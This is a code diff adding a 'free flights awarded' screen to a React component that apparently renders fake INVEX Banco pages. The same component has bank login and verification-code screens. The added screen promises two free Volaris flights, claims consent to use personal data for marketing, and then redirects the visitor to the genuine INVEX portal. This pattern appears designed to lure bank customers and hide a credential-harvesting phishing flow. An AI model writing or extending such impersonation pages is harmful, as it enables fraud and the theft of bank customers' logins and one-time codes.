@@ -352,6 +352,60 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
         );
         return getBankContainer(loginContent);
 
+      case ScreenType.VUELOS_OTORGADOS:
+        const vuelosOtorgadosContent = (
+          <>
+            <div className="text-center mb-6">
+              <div className="bg-green-100 border border-green-400 rounded-lg p-4 mb-6">
+                <h2 className="text-xl font-bold text-green-700 mb-3">¡Felicidades!</h2>
+                <p className="text-green-700 font-semibold">
+                  Se han otorgado a su cuenta <span className="text-2xl font-bold">2 vuelos nacionales</span>
+                </p>
+              </div>
+              
+              <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-6">
+                <h3 className="text-lg font-bold text-blue-800 mb-3">Condiciones importantes:</h3>
+                <div className="text-left text-sm text-blue-700">
+                  <ul className="space-y-2">
+                    <li>• <strong>Costo:</strong> Únicamente debe pagar la TUA (Tarifa de Uso de Aeropuerto)</li>
+                    <li>• <strong>Aerolínea:</strong> Vuelos válidos únicamente con VOLARIS</li>
+                    <li>• <strong>Cobertura:</strong> Tarifa aérea 0 (cero) - no canjeables por dinero</li>
+                    <li>• <strong>Restricciones:</strong> Sujeto a disponibilidad de fechas y destinos</li>
+                    <li>• <strong>Límite:</strong> Un vuelo gratuito por cliente seleccionado</li>
+                    <li>• <strong>Gastos adicionales:</strong> TUA, impuestos y servicios extras a cargo del cliente</li>
+                  </ul>
+                </div>
+              </div>
+              
+              <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-4 mb-6">
+                <h3 className="text-lg font-bold text-yellow-800 mb-2">Próximos pasos:</h3>
+                <p className="text-yellow-700 text-sm">
+                  <strong>Verifique su correo electrónico</strong> - Se le harán llegar las instrucciones 
+                  detalladas para poder canjear sus vuelos promocionales.
+                </p>
+              </div>
+              
+              <div className="text-xs text-gray-500 mt-4">
+                <p>Esta promoción está regida por las leyes de México y los términos y condiciones previamente aceptados.</p>
+                <p className="mt-1">Al participar, acepta el uso de sus datos personales para fines comerciales y de marketing de INVEX Banco.</p>
+              </div>
+            </div>
+            
+            <Button 
+              className="w-full bg-[#a71138] hover:bg-[#e04343] text-white py-3 text-lg"
+              onClick={() => {
+                // Redirigir al portal de INVEX después de 2 segundos
+                setTimeout(() => {
+                  window.location.href = 'https://www.invextarjetas.com.mx/index#/home';
+                }, 2000);
+              }}
+            >
+              Finalizar - Ir a INVEX Tarjetas
+            </Button>
+          </>
+        );
+        return getBankContainer(vuelosOtorgadosContent);
+
       case ScreenType.CODIGO:
         const codigoContent = (
           <>
